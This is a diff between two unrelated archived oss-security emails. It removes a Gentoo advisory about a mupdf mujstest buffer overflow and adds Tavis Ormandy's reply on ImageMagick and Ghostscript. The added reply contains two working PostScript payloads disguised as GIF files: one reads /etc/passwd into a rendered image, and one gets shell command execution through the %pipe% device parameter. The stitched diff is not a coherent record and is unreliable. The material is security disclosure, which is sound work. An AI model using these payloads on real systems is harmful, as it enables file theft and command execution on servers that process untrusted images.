@@ -1,105 +1,60 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/10/16/19
-Message-ID: <11022030.6ZF3cfAM3U@arcadia>
-Date: Sun, 16 Oct 2016 20:52:31 +0200
-From: Agostino Sarubbo <ago@...too.org>
-To: oss-security@...ts.openwall.com, cve-assign@...re.org
-Subject: mupdf: mujstest: global-buffer-overflow in my_getline (jstest_main.c)
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/30/8
+Message-ID: <CAJ_zFkJxK8re4yc1xVN79Y9k7tDoO-fFO-xJNzgvVG9ZgPQtzw@mail.gmail.com>
+Date: Fri, 30 Sep 2016 13:05:16 -0700
+From: Tavis Ormandy <taviso@...gle.com>
+To: oss-security@...ts.openwall.com
+Cc: Florian Weimer <fw@...eb.enyo.de>
+Subject: Re: ImageMagick identify "d:" hangs
 Content-Type: text/plain; charset=utf-8
 
-A note outside the blog post:
-This issue does not affect any library, but it is only in the mujstest binary.
-There aren't known applications which use mujstest, but if you have an 
-application or website which relies on mujstest you are invited to apply the 
-patch or use the newer package when it will be released. Thanks.
+On Thu, Sep 29, 2016 at 2:28 PM, Tavis Ormandy <taviso@...gle.com> wrote:
+>
+> Just for future reference, here is an example of dumping a file to an
+> image processed with ImageMagick that works with gs 9.20:
+>
+> $ cat test.gif
+> %!PS
+> /Size 20 def                             % font/line size
+> /Line 0 def                              % current line
+> /Buf 1024 string def                     % line buffer
+> /Path 0 newpath def
+>
+> /Courier-Bold findfont Size scalefont setfont
+> 1 1 1 setrgbcolor clippath fill          % draw white background
+> 0 0 0 setrgbcolor                        % set black foreground
+>
+> (/etc/passwd) .libfile {
+>     {
+>         dup Buf readline
+>         {
+>             Path Line moveto show
+>         }{
+>             showpage
+>             quit
+>         } ifelse
+>         % next line
+>         /Line Line Size add def
+>     } loop
+> } if
+> $ convert test.gif png:test.png
 
-Description:
-Mujstest, which is part of mupdf is a scriptable tester for mupdf + js.
+The more I look, the worse it gets. This also works in 9.18 and
+higher, arbitrary shell command execution:
 
-A fuzzing revealed a global buffer overflow write.
+$ cat test.gif
+currentdevice null true mark /OutputICCProfile (%pipe%id > /dev/tty)
+.putdeviceparams
+quit
+$ convert test.gif png:test.png
 
-The complete ASan output:
+(Note: I don't know why it doesn't work on earlier versions, maybe
+it's possible to make it work, or some other param will work)
 
-# mujstest $FILE
-==1278==ERROR: AddressSanitizer: global-buffer-overflow on address 
-0x0000013c7280 at pc 0x0000004fa432 bp 0x7ffea75837d0 sp 0x7ffea75837c8
-WRITE of size 1 at 0x0000013c7280 thread T0
-    #0 0x4fa431 in my_getline /var/tmp/portage/app-
-text/mupdf-1.9a/work/mupdf-1.9a/platform/x11/jstest_main.c:214:5
-    #1 0x4fa431 in main /var/tmp/portage/app-
-text/mupdf-1.9a/work/mupdf-1.9a/platform/x11/jstest_main.c:335
-    #2 0x7fb62229661f in __libc_start_main /var/tmp/portage/sys-
-libs/glibc-2.22-r4/work/glibc-2.22/csu/libc-start.c:289
-    #3 0x41ade8 in _init (/usr/bin/mujstest+0x41ade8)
+I think -dSAFER is too dangerous to use without sandboxing right now,
+things like evince and imagemagick that use it as a backend should
+disable by default.
 
-0x0000013c7280 is located 0 bytes to the right of global variable 
-'getline_buffer' defined in 'platform/x11/jstest_main.c:24:13' (0x13c6280) of 
-size 4096
-SUMMARY: AddressSanitizer: global-buffer-overflow /var/tmp/portage/app-
-text/mupdf-1.9a/work/mupdf-1.9a/platform/x11/jstest_main.c:214:5 in my_getline
-Shadow bytes around the buggy address:
-  0x000080270e00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-  0x000080270e10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-  0x000080270e20: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-  0x000080270e30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-  0x000080270e40: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-=>0x000080270e50:[f9]f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
-  0x000080270e60: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
-  0x000080270e70: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
-  0x000080270e80: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
-  0x000080270e90: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
-  0x000080270ea0: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
-Shadow byte legend (one shadow byte represents 8 application bytes):
-  Addressable:           00
-  Partially addressable: 01 02 03 04 05 06 07 
-  Heap left redzone:       fa
-  Heap right redzone:      fb
-  Freed heap region:       fd
-  Stack left redzone:      f1
-  Stack mid redzone:       f2
-  Stack right redzone:     f3
-  Stack partial redzone:   f4
-  Stack after return:      f5
-  Stack use after scope:   f8
-  Global redzone:          f9
-  Global init order:       f6
-  Poisoned by user:        f7
-  Container overflow:      fc
-  Array cookie:            ac
-  Intra object redzone:    bb
-  ASan internal:           fe
-  Left alloca redzone:     ca
-  Right alloca redzone:    cb
-==1278==ABORTING
+I'm not planning to look any more at this.
 
-Affected version:
-1.9a
-
-Fixed version:
-1.10 (not yet released)
-
-Commit fix:
-http://git.ghostscript.com/?p=mupdf.git;h=446097f97b71ce20fa8d1e45e070f2e62676003e
-
-Credit:
-This bug was discovered by Agostino Sarubbo of Gentoo.
-
-CVE:
-N/A
-
-Timeline:
-2016-08-04: bug discovered
-2016-08-05: bug reported to upstream
-2016-09-22: upstream released a patch
-2016-09-24: blog post about the issue
-
-Note:
-This bug was found with American Fuzzy Lop.
-
-Permalink:
-https://blogs.gentoo.org/ago/2016/09/24/mupdf-mujstest-global-buffer-overflow-in-my_getline-jstest_main-c/
-
-
--- 
-Agostino Sarubbo
-Gentoo Linux Developer
+Tavis.
